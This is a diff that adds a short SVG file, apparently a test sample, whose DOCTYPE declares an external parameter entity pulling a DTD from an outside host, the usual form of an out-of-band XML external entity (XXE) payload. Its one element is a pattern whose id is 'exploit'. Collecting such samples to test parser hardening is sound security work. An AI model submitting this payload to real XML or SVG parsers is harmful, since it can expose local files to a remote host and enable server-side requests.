@@ -1,0 +1,13 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ENTITY % dtd SYSTEM "http://hellorandom.000webhost.com/">
+%dtd;
+]>
+<svg>
+<defs>
+<pattern id="exploit">
+ <text x="100" y="100">
+ </text>
+</pattern>
+</defs>
+</svg>
